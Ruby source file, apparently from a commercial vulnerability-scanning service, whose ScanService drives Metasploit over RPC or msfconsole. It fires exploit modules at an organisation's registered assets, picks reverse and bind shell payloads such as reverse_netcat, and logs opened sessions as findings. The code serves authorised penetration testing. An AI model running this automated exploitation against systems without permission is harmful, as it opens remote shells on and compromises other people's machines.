require 'json'
require 'socket'
require 'open3'
require 'tempfile'
require 'timeout'
require 'net/smtp'
require 'thread'
require 'set'
require 'shellwords'
require 'pty'
require 'msfrpc-client'

class ScanService
  MSF_BASE = begin
    opt = '/opt/metasploit-framework/embedded/framework/modules/exploits'
    apt = '/usr/share/metasploit-framework/modules/exploits'
    ENV['MSF_MODULES_PATH'] || (Dir.exist?(opt) ? opt : apt)
  end

  MSF_AUXILIARY_BASE = ENV['MSF_AUXILIARY_PATH'] ||
    MSF_BASE.sub('/modules/exploits', '/modules/auxiliary')

  puts "[ScanService] MSF_BASE=#{MSF_BASE} MSF_AUXILIARY_BASE=#{MSF_AUXILIARY_BASE}"

  def initialize(org_id, filter_params, user_id, scan = nil, asset_ids = [], scan_options = {})
    @org_id        = org_id
    @filter_params = (filter_params || {}).transform_keys(&:to_s)
    @user_id       = user_id
    @scan          = scan
    @asset_ids     = Array(asset_ids).map(&:to_i).select { |id| id > 0 }
    @scan_options  = scan_options || {}
  end

  def perform
    puts "Starting Scan for Org #{@org_id}..."
    targets = get_targets(@org_id)
    results = []
    threads = []
    mutex = Mutex.new

    targets.each do |target|
      target_ip    = target['ip']
      target_ports = target['ports']
      asset_id     = target['asset_id']

      threads << Thread.new do
        begin
          scan_target_id  = create_scan_target(asset_id)
          target_findings = 0
          target_exploits = 0

          if connect_network(target_ip, target['proxy']) == 1
            target_os  = target['os']
            modules    = get_modules_for_target(target_os)
            sev_filter = @filter_params['severities']

            # Safe mode: open one shared MSF console for all modules on this target
            # so we avoid the overhead of create/destroy per module
            if @scan_options[:safe_mode]
              aux_client = rpc_client
              if aux_client
                con = aux_client.call('console.create') rescue nil
                if con
                  Thread.current[:msf_aux_console] = con['id'].to_s
                  puts "[SafeMode] Shared console #{Thread.current[:msf_aux_console]} opened for #{target_ip}"
                end
              end
            end

            succeeded_exploit_ids = Set.new

            effective_ports = if @scan_options[:port_override].present?
              parsed = parse_ports(@scan_options[:port_override])
              puts "Port override for #{target_ip}: #{parsed.join(', ')}"
              parsed
            else
              target_ports
            end

            effective_ports.each do |port|
              modules.each do |mod|
                severity = read_module_rank(mod[:file])
                next if sev_filter.present? && !sev_filter.include?(severity)

                exploit_record = get_or_create_exploit_record(mod[:path], mod[:file])
                next if succeeded_exploit_ids.include?(exploit_record.id)

                exploit_hash = {
                  'id'                => exploit_record.id,
                  'name'              => exploit_record.name,
                  'metasploit_module' => mod[:path],
                  'severity'          => severity,
                  'default_payload'   => exploit_record.default_payload
                }

                start_ms = (Time.now.to_f * 1000).to_i
                result   = attack(exploit_hash, target_ip, port, target['proxy'])
                elapsed  = (Time.now.to_f * 1000).to_i - start_ms

                target_exploits += 1
                exploit_result = if @scan_options[:safe_mode]
                  result[:success] ? 'detected' : 'not_detected'
                else
                  result[:success] ? 'success' : 'failed'
                end
                create_scan_exploit(asset_id, exploit_record.id, exploit_result, elapsed)

                if result[:success]
                  target_findings += 1
                  succeeded_exploit_ids << exploit_record.id
                  create_finding(asset_id, exploit_record.id, severity, result[:evidence], port)
                end

                mutex.synchronize do
                  results << {
                    target:          target_ip,
                    port:            port,
                    exploit:         mod[:path],
                    exploit_name:    exploit_record.name,
                    severity:        severity,
                    success:         result[:success],
                    scan_mode:       @scan_options[:safe_mode] ? 'reconnaissance' : 'exploit',
                    timestamp:       Time.now,
                    cve_id:          exploit_record.cve_id,
                    description:     exploit_record.description,
                    disclosure_date: exploit_record.disclosure_date&.to_s,
                    references:      exploit_record.references,
                    evidence:        result[:evidence]
                  }
                end
              end
            end

            # Destroy the shared auxiliary console now that all modules are done
            if @scan_options[:safe_mode] && Thread.current[:msf_aux_console]
              rpc_client&.call('console.destroy', Thread.current[:msf_aux_console]) rescue nil
              puts "[SafeMode] Shared console closed for #{target_ip}"
              Thread.current[:msf_aux_console] = nil
            end

            disconnect_network()
          else
            puts "Could not connect to target #{target_ip}."
          end

          complete_scan_target(scan_target_id, target_exploits, target_findings)
        rescue => e
          puts "Error scanning target #{target_ip}: #{e.message}"
          puts e.backtrace.first(6).join("\n")
        end
      end
    end

    threads.each(&:join)

    findings_count = results.count { |r| r[:success] }
    critical = results.count { |r| r[:success] && r[:severity]&.downcase == 'critical' }
    high     = results.count { |r| r[:success] && r[:severity]&.downcase == 'high' }
    medium   = results.count { |r| r[:success] && r[:severity]&.downcase == 'medium' }
    low      = results.count { |r| r[:success] && r[:severity]&.downcase == 'low' }

    @scan&.update!(
      status:                'completed',
      end_time:              Time.current,
      total_exploits_tested: results.map { |r| r[:exploit] }.uniq.size,
      findings_count:        findings_count,
      scanned_assets:        targets.size,
      critical_findings:     critical,
      high_findings:         high,
      medium_findings:       medium,
      low_findings:          low,
      safe_mode:             @scan_options[:safe_mode] || false
    )

    successful_results = @scan_options[:safe_mode] ? results : results.select { |r| r[:success] }
    report_json = result_to_json(successful_results)

    Report.create!(
      organization_id: @org_id,
      user_id:         @user_id,
      generated_by:    @user_id,
      scan_id:         @scan&.id,
      report_name:     "Scan #{Time.current.strftime('%Y-%m-%d %H:%M')}",
      report_type:     @scan_options[:safe_mode] ? 'reconnaissance' : 'vulnerability',
      report_format:   'json',
      report_data:     successful_results,
      generated_at:    Time.current
    )

    log_results_to_file(report_json, @org_id)
    cleanup_old_logs(7)

    user = User.find_by(id: @user_id)
    ScanMailer.completed(user, @scan).deliver_now if user && @scan

    puts "Scan complete."
  rescue => e
    puts "Scan failed: #{e.message}"
    @scan&.update!(status: 'failed', end_time: Time.current)
    user = User.find_by(id: @user_id)
    ScanMailer.failed(user, @scan).deliver_now if user && @scan
    raise
  end

  private

  def connect_network(ip, proxy = nil)
    puts "Checking connectivity to #{ip}#{proxy ? " via #{proxy}" : " (direct)"}..."
    proxy ? socks5_alive_check(ip, proxy) : direct_alive_check(ip)
  end

  def disconnect_network
    puts "Disconnecting from network..."
    return 1
  end

  def socks5_alive_check(target_ip, proxy)
    parts      = proxy.sub(/\Asocks5:\/?\/?/, '').split(':')
    socks_host = parts[0]
    socks_port = parts[1].to_i
    return 0 unless socks_host.present? && socks_port > 0

    [22, 80, 443, 445].each do |test_port|
      begin
        Timeout.timeout(5) do
          sock = TCPSocket.new(socks_host, socks_port)
          sock.write("\x05\x01\x00")
          unless sock.read(2) == "\x05\x00"
            sock.close
            next
          end
          addr_bytes = target_ip.split('.').map(&:to_i).pack('C4')
          sock.write("\x05\x01\x00\x01" + addr_bytes + [test_port].pack('n'))
          resp = sock.read(10)
          sock.close
          if resp && resp.bytesize >= 2 && resp.getbyte(1) == 0
            puts "[+] #{target_ip}:#{test_port} reachable via agent proxy"
            return 1
          end
        end
      rescue Errno::ECONNREFUSED
        puts "[+] #{target_ip}:#{test_port} refused via proxy — host is alive"
        return 1
      rescue => e
        puts "[-] #{target_ip}:#{test_port} via proxy: #{e.message}"
      end
    end
    puts "[-] #{target_ip} unreachable via agent proxy"
    0
  rescue => e
    puts "Connect check error for #{target_ip}: #{e.message}"
    0
  end

  def direct_alive_check(ip)
    # ICMP ping — fast single-packet probe
    if system("ping -c 1 -W 1 #{Shellwords.escape(ip)} > /dev/null 2>&1")
      puts "[+] #{ip} alive (ICMP ping)"
      return 1
    end

    # Fallback: some hosts filter ICMP but have open TCP ports
    [22, 80, 443, 445, 8080].each do |test_port|
      begin
        Timeout.timeout(5) { TCPSocket.new(ip, test_port).close }
        puts "[+] #{ip}:#{test_port} reachable (direct)"
        return 1
      rescue Errno::ECONNREFUSED
        puts "[+] #{ip}:#{test_port} refused — host is alive (direct)"
        return 1
      rescue => e
        puts "[-] #{ip}:#{test_port}: #{e.message}"
      end
    end
    puts "[-] #{ip} unreachable (direct)"
    0
  rescue => e
    puts "Connect check error for #{ip}: #{e.message}"
    0
  end

  def attack(exploit, target_ip, port, proxy = nil)
    timeout_secs = (@scan_options[:timeout].presence || 120).to_i
    client       = rpc_client

    unless client
      return attack_subprocess(exploit, target_ip, port, proxy, timeout_secs)
    end

    if @scan_options[:safe_mode]
      rpc_run_auxiliary(client, exploit, target_ip, port, proxy, timeout_secs)
    else
      rpc_run_exploit(client, exploit, target_ip, port, proxy, timeout_secs)
    end
  rescue => e
    puts "Attack error [#{exploit['metasploit_module']}]: #{e.message}"
    { success: false, evidence: nil }
  end

  def rpc_config
    {
      host: ENV.fetch('MSF_RPC_HOST', '127.0.0.1'),
      port: ENV.fetch('MSF_RPC_PORT', '55553').to_i,
      ssl:  ENV.fetch('MSF_RPC_SSL', 'true') =~ /\A(t|y|1)/i ? true : false,
      uri:  '/api/'
    }
  end

  def outbound_ip_for(target_ip)
    UDPSocket.open { |s| s.connect(target_ip, 1); s.addr.last }
  rescue
    ENV.fetch('MSF_LHOST', '127.0.0.1')
  end

  def rpc_client
    return Thread.current[:msf_rpc] if Thread.current[:msf_rpc]
    pass = ENV['MSF_RPC_PASS']
    unless pass
      puts "WARNING: MSF_RPC_PASS not set — falling back to msfconsole subprocess (slow)"
      return nil
    end
    client = Msf::RPC::Client.new(rpc_config)
    client.login(ENV.fetch('MSF_RPC_USER', 'msf'), pass)
    Thread.current[:msf_rpc] = client
  rescue => e
    puts "msfrpcd connection failed: #{e.message} — falling back to msfconsole subprocess (slow)"
    nil
  end

  def select_payload(client, mod_name, use_bind)
    res      = client.call('module.compatible_payloads', mod_name)
    payloads = res['payloads'] || []
    return nil if payloads.empty?

    if use_bind
      prefs  = %w[cmd/unix/bind_netcat cmd/unix/bind_perl cmd/unix/bind_ruby linux/x86/shell_bind_tcp]
      chosen = prefs.find { |p| payloads.include?(p) }
      chosen || payloads.find { |p| p.include?('bind') } || payloads.first
    else
      prefs  = %w[cmd/unix/interact cmd/unix/reverse_netcat cmd/unix/reverse_perl
                  linux/x86/shell_reverse_tcp linux/x86/shell/reverse_tcp]
      chosen = prefs.find { |p| payloads.include?(p) }
      chosen || payloads.find { |p| p.include?('reverse') } || payloads.first
    end
  rescue => e
    puts "compatible_payloads failed for #{mod_name}: #{e.message}"
    nil
  end

  def rpc_run_exploit(client, exploit, target_ip, port, proxy, timeout_secs)
    mod_name = exploit['metasploit_module'].sub(/\Aexploit\//, '')
    use_bind = proxy.present?
    payload  = exploit['default_payload'].presence || select_payload(client, mod_name, use_bind)

    unless payload
      puts "No compatible payload for #{mod_name}, skipping"
      return { success: false, evidence: nil }
    end

    options = {
      'RHOSTS'         => target_ip,
      'PAYLOAD'        => payload,
      'LHOST'          => outbound_ip_for(target_ip),
      'LPORT'          => ENV.fetch('MSF_LPORT', '4444'),
      'ConnectTimeout' => '15',
      'ExitOnSession'  => 'false'
    }
    options['RPORT']   = port.to_s if port
    options['Proxies'] = proxy     if proxy

    puts "RPC exploit: #{target_ip}:#{port} [#{mod_name}] payload=#{payload}#{proxy ? " via #{proxy}" : ""}"

    existing = (client.call('session.list') rescue {}).keys.to_set
    result   = client.call('module.execute', 'exploit', mod_name, options)
    job_id   = result['job_id']&.to_s

    unless job_id
      puts "module.execute returned no job_id for #{mod_name}"
      return { success: false, evidence: nil }
    end

    deadline = Time.now + timeout_secs
    while Time.now < deadline
      sleep 2
      sessions    = client.call('session.list') rescue {}
      new_entries = sessions.reject { |id, _| existing.include?(id) }
      if new_entries.any?
        sid, info = new_entries.first
        evidence  = "Session #{sid}: #{info['tunnel_local']} -> #{info['tunnel_peer']} " \
                    "[#{info['session_type']} via #{mod_name}]"
        puts "[+] #{evidence}"
        return { success: true, evidence: evidence }
      end
      jobs = client.call('job.list') rescue {}
      break unless jobs.key?(job_id)
    end

    { success: false, evidence: nil }
  rescue Msf::RPC::ServerException => e
    puts "RPC ServerException [#{mod_name}]: #{e.message}"
    { success: false, evidence: nil }
  end

  def rpc_run_auxiliary(client, exploit, target_ip, port, proxy, timeout_secs)
    mod_name   = exploit['metasploit_module'].sub(/\Aauxiliary\//, '')
    shared_cid = Thread.current[:msf_aux_console]
    own_cid    = nil

    unless shared_cid
      con     = client.call('console.create')
      own_cid = con['id'].to_s
    end

    cid = shared_cid || own_cid

    begin
      cmds = [
        "use auxiliary/#{mod_name}",
        "set RHOSTS #{target_ip}",
        (port ? "set RPORT #{port}" : nil),
        "set ConnectTimeout 15",
        (proxy ? "set Proxies #{proxy}" : nil),
        "run",
        "echo ===AEGIS_DONE==="
      ].compact.join("\n") + "\n"

      client.call('console.write', cid, cmds)
      sleep 4  # give MSF time to load the module before first read

      deadline         = Time.now + timeout_secs
      output           = ''
      consecutive_idle = 0

      while Time.now < deadline
        sleep 2
        res     = client.call('console.read', cid) rescue {}
        chunk   = res['data'].to_s
        output += chunk
        # Sentinel wins immediately if echo command is supported
        break if output.include?('===AEGIS_DONE===')
        # Fallback: two consecutive idle (busy:false) reads means module is done
        if res['busy']
          consecutive_idle = 0
        else
          consecutive_idle += 1
          break if consecutive_idle >= 2
        end
      end

      output = output.sub('===AEGIS_DONE===', '').rstrip
      ip_pat  = Regexp.escape(target_ip)
      meaningful_ip_lines = output.scan(/\[\*\] #{ip_pat}.+/i)
                                  .reject { |l| l.match?(/Scanned \d+ of \d+ hosts/i) }
      success  = output.match?(/\[\+\]/i) || meaningful_ip_lines.any?
      evidence = (output.scan(/\[\+\].+/i) + meaningful_ip_lines).map(&:strip).join("\n").first(500)
      puts success ? "[+] #{mod_name} detected on #{target_ip}" : "[-] #{mod_name} — nothing detected on #{target_ip}"
      { success: success, evidence: evidence.presence }
    ensure
      client.call('console.destroy', own_cid) rescue nil if own_cid
    end
  rescue Msf::RPC::ServerException => e
    puts "RPC ServerException [#{mod_name}]: #{e.message}"
    Thread.current[:msf_aux_console] = nil if shared_cid  # console may be dead; clear so next module creates fresh
    { success: false, evidence: nil }
  end

  # Fallback used when msfrpcd is unavailable (MSF_RPC_PASS not set or connection refused).
  # Uses PTY.spawn so msfconsole sees a terminal and outputs [+] / [*] lines in full.
  def attack_subprocess(exploit, target_ip, port, proxy, timeout_secs)
    rc_file = Tempfile.new(['aegis_', '.rc'])
    output  = ''
    pid     = nil

    begin
      rc_file.write(build_resource_file(exploit, target_ip, port, proxy))
      rc_file.flush

      puts "Launching msfconsole for #{target_ip}:#{port} [#{exploit['name']}]#{proxy ? " via #{proxy}" : " (direct)"}"

      master, slave, pid = PTY.spawn('msfconsole', '-q', '--no-readline', '-r', rc_file.path)
      slave.close rescue nil  # parent doesn't need the slave end

      begin
        Timeout.timeout(timeout_secs + 10) do
          begin
            loop { output += master.readpartial(4096) }
          rescue Errno::EIO, EOFError
            # PTY slave closed — process finished
          end
        end
      rescue Timeout::Error
        Process.kill('TERM', pid) rescue nil
      ensure
        Process.wait(pid) rescue nil
        master.close rescue nil
      end

      # Strip ANSI colour codes produced by msfconsole in TTY mode
      clean  = output.gsub(/\e\[[\d;]*[A-Za-z]/, '').gsub(/\r\n?/, "\n")
      ip_pat = Regexp.escape(target_ip)

      # For safe mode: [+] lines are explicit hits; [*] ip:port lines with actual content
      # (not the generic "Scanned X of Y hosts" completion line) count as informational detections.
      meaningful_ip_lines = clean.scan(/\[\*\] #{ip_pat}.+/i)
                                 .reject { |l| l.match?(/Scanned \d+ of \d+ hosts/i) }

      success = if @scan_options[:safe_mode]
        clean.match?(/\[\+\]/i) || meaningful_ip_lines.any?
      else
        clean.match?(/session \d+ opened|Meterpreter session|Command shell session/i)
      end

      evidence_lines = if @scan_options[:safe_mode]
        (clean.scan(/\[\+\].*/i) + meaningful_ip_lines).join("\n")
      else
        clean.scan(/\[\+\].*|.*session \d+ opened.*/i).join("\n")
      end
      evidence = evidence_lines.length > 500 ? evidence_lines[0, 500] : evidence_lines
      { success: success, evidence: evidence.presence || (success ? 'Detected' : nil) }
    rescue => e
      puts "Attack failed: #{e.message}"
      { success: false, evidence: nil }
    ensure
      rc_file.close! rescue nil
    end
  end

  def build_resource_file(exploit, target_ip, port, proxy)
    @scan_options[:safe_mode] ? build_auxiliary_rc(exploit, target_ip, port, proxy)
                              : build_exploit_rc(exploit, target_ip, port, proxy)
  end

  def build_exploit_rc(exploit, target_ip, port, proxy)
    lhost   = outbound_ip_for(target_ip)
    lport   = ENV.fetch('MSF_LPORT', '4444')
    payload = exploit['default_payload'].presence

    lines = [
      "use #{exploit['metasploit_module']}",
      "set RHOSTS #{target_ip}",
      (port ? "set RPORT #{port}" : nil),
      (payload ? "set PAYLOAD #{payload}" : nil),
      "set LHOST #{lhost}",
      "set LPORT #{lport}",
      "set ConnectTimeout 15",
      (proxy ? "set Proxies #{proxy}" : nil),
      "run -z",
      "sleep 15",
      "sessions -l",
      "exit -y"
    ].compact
    lines.join("\n") + "\n"
  end

  def build_auxiliary_rc(exploit, target_ip, port, proxy)
    lines = [
      "use #{exploit['metasploit_module']}",
      "set RHOSTS #{target_ip}",
      (port ? "set RPORT #{port}" : nil),
      "set ConnectTimeout 15",
      (proxy ? "set Proxies #{proxy}" : nil),
      "run",
      "exit -y"
    ].compact
    lines.join("\n") + "\n"
  end

  def create_scan_target(asset_id)
    return nil unless @scan&.id && asset_id
    result = ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.scan_targets (scan_id, asset_id, target_status, started_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, 'scanning', NOW()) " \
      "ON CONFLICT (scan_id, asset_id) DO UPDATE SET target_status = 'scanning', started_at = NOW() " \
      "RETURNING id"
    )
    result.first&.fetch('id', nil)
  rescue => e
    puts "Error creating scan_target: #{e.message}"
    nil
  end

  def complete_scan_target(scan_target_id, exploits_tested, findings_count)
    return unless scan_target_id
    ActiveRecord::Base.connection.execute(
      "UPDATE vuln_scanner.scan_targets " \
      "SET target_status = 'completed', completed_at = NOW(), " \
      "exploits_tested = #{exploits_tested.to_i}, findings_count = #{findings_count.to_i} " \
      "WHERE id = #{scan_target_id.to_i}"
    )
  rescue => e
    puts "Error completing scan_target: #{e.message}"
  end

  def create_scan_exploit(asset_id, exploit_id, result, elapsed_ms)
    return unless @scan&.id && asset_id && exploit_id
    safe_result = %w[success failed detected not_detected].include?(result) ? result : 'failed'
    ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.scan_exploits (scan_id, asset_id, exploit_id, result, execution_time_ms, tested_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_result}', #{elapsed_ms.to_i}, NOW())"
    )
  rescue => e
    puts "Error creating scan_exploit: #{e.message}"
  end

  def create_finding(asset_id, exploit_id, severity, evidence, port = nil)
    return unless @scan&.id && asset_id && exploit_id
    safe_severity = %w[critical high medium low].include?(severity&.downcase) ? severity.downcase : 'medium'
    safe_evidence = ActiveRecord::Base.connection.quote(evidence.to_s)
    port_sql      = port ? port.to_i : 'NULL'
    ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.findings (scan_id, asset_id, exploit_id, severity, status, evidence, port, discovered_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_severity}', 'open', #{safe_evidence}, #{port_sql}, NOW())"
    )
  rescue => e
    puts "Error creating finding: #{e.message}"
  end

  def result_to_json(results_raw)
    JSON.generate(results_raw)
  rescue JSON::GeneratorError => e
    puts "JSON Generation Error: #{e.message}"
  end

  def log_results_to_file(results_json, org_id)
    log_dir = Rails.root.join("logs")
    FileUtils.mkdir_p(log_dir)

    filename = "#{log_dir}/scan_results_org_#{org_id}_#{Time.now.strftime('%Y%m%d_%H%M%S')}.json"
    File.write(filename, results_json)
    puts "Results logged to #{filename}"
  rescue => e
    puts "Failed to log results to file: #{e.message}"
  end

  def cleanup_old_logs(days = 7)
    log_dir = Rails.root.join("logs")
    return unless Dir.exist?(log_dir)

    puts "Cleaning up logs older than #{days} days..."
    cutoff_time = Time.now - (days * 24 * 60 * 60)

    Dir.glob("#{log_dir}/*.json").each do |file|
      begin
        if File.mtime(file) < cutoff_time
          File.delete(file)
          puts "Deleted old log: #{file}"
        end
      rescue => e
        puts "Failed to delete #{file}: #{e.message}"
      end
    end
  end

  def get_modules_for_target(target_os)
    allowlist = @filter_params['module_allowlist']

    if @scan_options[:safe_mode]
      base   = MSF_AUXILIARY_BASE
      prefix = 'auxiliary/'
      dirs   = auxiliary_scanner_dirs(target_os)
    else
      base   = MSF_BASE
      prefix = 'exploit/'
      dirs   = platform_dirs(target_os)
    end

    files = dirs.any? ? dirs.flat_map { |d| Dir.glob("#{base}/#{d}/**/*.rb") }
                      : Dir.glob("#{base}/**/*.rb")

    # If the targeted subdirs produced nothing, fall back to the full tree
    if files.empty? && dirs.any?
      puts "[#{@scan_options[:safe_mode] ? 'SafeMode' : 'Scan'}] Subdirs #{dirs.inspect} empty under #{base}, falling back to full tree"
      files = Dir.glob("#{base}/**/*.rb")
    end

    if @scan_options[:safe_mode]
      puts "[SafeMode] Auxiliary base: #{base} | dirs: #{dirs.inspect} | modules found: #{files.size}"
    end

    mods = files.uniq.map { |f| { path: prefix + f.sub("#{base}/", '').sub('.rb', ''), file: f } }
    allowlist.present? ? mods.select { |m| allowlist.include?(m[:path]) } : mods
  end

  def platform_dirs(platform)
    case platform&.downcase
    when 'windows' then %w[windows multi]
    when 'linux'   then %w[linux unix multi]
    when 'macos'   then %w[osx apple_ios multi]
    else []
    end
  end

  def auxiliary_scanner_dirs(platform)
    case platform&.downcase
    when 'windows' then %w[scanner/smb scanner/http scanner/ssh scanner/vnc]
    when 'linux'   then %w[scanner/ssh scanner/ftp scanner/http scanner/mysql scanner/postgres]
    when 'macos'   then %w[scanner/ssh scanner/http scanner/vnc]
    else                %w[scanner/ssh scanner/ftp scanner/http]
    end
  end

  def read_module_rank(file_path)
    content = File.read(file_path) rescue ''
    rank    = content.match(/\bRank\s*=\s*(\w+)/i)&.[](1).to_s.downcase
    case rank
    when /excellent|great/ then 'critical'
    when /good/            then 'high'
    when /normal|average/  then 'medium'
    else                        'low'
    end
  end

  def get_or_create_exploit_record(module_path, file_path)
    exploit = Exploit.find_or_initialize_by(exploit_id: module_path)
    if exploit.new_record? || exploit.description.blank?
      meta = parse_module_metadata(file_path)
      exploit.name             = meta[:name].presence ||
                                 module_path.split('/').last.tr('_', ' ').split.map(&:capitalize).join(' ')
      exploit.description      = meta[:description]
      exploit.cve_id           = meta[:cve_id]
      exploit.disclosure_date  = meta[:disclosure_date]
      exploit.references       = meta[:references]
      exploit.authors          = meta[:authors]
      exploit.severity         = read_module_rank(file_path)
      exploit.metasploit_module = module_path
      exploit.save!
    end
    exploit
  rescue ActiveRecord::RecordNotUnique
    Exploit.find_by!(exploit_id: module_path)
  end

  def parse_module_metadata(file_path)
    content = File.read(file_path) rescue ''

    # Real module name
    name = content.match(/'Name'\s*=>\s*['"]([^'"]+)['"]/m)&.[](1)&.strip

    # Description — handles %q{}, %q(), or plain string
    desc = content.match(/'Description'\s*=>\s*%q[{(](.+?)[})]/m)&.[](1)
    desc ||= content.match(/'Description'\s*=>\s*["'](.+?)["']/m)&.[](1)
    desc = desc&.gsub(/\s+/, ' ')&.strip

    # CVE — first match, normalise to CVE-YYYY-NNNN
    raw_cve = content.match(/\[\s*['"]CVE['"]\s*,\s*['"]([^'"]+)['"]\s*\]/)&.[](1)
    cve_id  = raw_cve ? (raw_cve.start_with?('CVE') ? raw_cve : "CVE-#{raw_cve}") : nil

    # All references as [{type, value}] pairs
    refs = content.scan(/\[\s*['"](\w+)['"]\s*,\s*['"]([^'"]+)['"]\s*\]/)
                  .map { |type, val| { 'type' => type, 'value' => val } }

    # Disclosure date
    raw_date       = content.match(/'DisclosureDate'\s*=>\s*['"]([^'"]+)['"]/m)&.[](1)
    disclosure_date = raw_date ? (Date.parse(raw_date) rescue nil) : nil

    # Author(s)
    authors_block = content.match(/'Authors?'\s*=>\s*\[([^\]]+)\]/m)&.[](1)
    authors = authors_block&.scan(/['"]([^'"]+)['"]/)&.flatten&.join(', ')
    authors ||= content.match(/'Authors?'\s*=>\s*['"]([^'"]+)['"]/m)&.[](1)

    { name: name, description: desc, cve_id: cve_id, references: refs,
      disclosure_date: disclosure_date, authors: authors }
  end

  def get_targets(org_id)
    condition = @asset_ids.any? ? "AND id IN (#{@asset_ids.map(&:to_i).join(',')})" : ""
    result = ActiveRecord::Base.connection.select_all(
      "SELECT id, ip_address, scan_config FROM vuln_scanner.assets WHERE organization_id = #{org_id.to_i} AND is_active = true #{condition}"
    )
    targets = []
    result.each do |row|
      config = JSON.parse(row['scan_config'] || '{}') rescue {}
      ports  = parse_ports(config['port'])
      ip     = row['ip_address'].to_s
      proxy = if @scan_options[:use_agent] == false
        nil
      else
        agent = Agent.find_for_target(org_id, ip)
        agent ? "socks5:127.0.0.1:#{agent.tunnel_port}" : nil
      end
      puts proxy ? "Routing #{ip} via agent proxy #{proxy}" : "Scanning #{ip} directly (no agent)"
      targets << { 'ip' => ip, 'asset_id' => row['id'].to_i, 'ports' => ports, 'proxy' => proxy, 'os' => config['os'] }
    end
    targets
  rescue => e
    puts "Error fetching targets: #{e.message}"
    []
  end

  def parse_ports(port_str)
    return [nil] if port_str.blank?  # nil → each module uses its own default RPORT

    str = port_str.to_s.strip

    # Range: "8000-8080" — pick one random port in range
    if str =~ /\A(\d+)-(\d+)\z/
      lo, hi = $1.to_i, $2.to_i
      return [rand(lo..hi)] if lo >= 1 && hi <= 65535 && lo <= hi
    end

    # Comma-separated or single: "22, 80, 443" — return all valid ports
    ports = str.split(',').map { |p| p.strip.to_i }.select { |p| p >= 1 && p <= 65535 }
    ports.any? ? ports : [rand(1..65535)]
  end

  def parse_port(port_str) = parse_ports(port_str).first

  def send_email(to_email, subject, body)
    from_email = ENV.fetch('SMTP_FROM', 'scanner@example.com')
    smtp_host  = ENV.fetch('SMTP_HOST', 'localhost')
    smtp_port  = ENV.fetch('SMTP_PORT', '25').to_i

    msg = <<~END_OF_MESSAGE
      From: #{from_email}
      To: #{to_email}
      Subject: #{subject}
      MIME-Version: 1.0
      Content-Type: text/plain; charset=utf-8

      #{body}
    END_OF_MESSAGE

    begin
      Net::SMTP.start(smtp_host, smtp_port) do |smtp|
        smtp.send_message msg, from_email, to_email
      end
      puts "Email sent to #{to_email}"
    rescue => e
      puts "Failed to send email: #{e.message}"
    end
  end
end
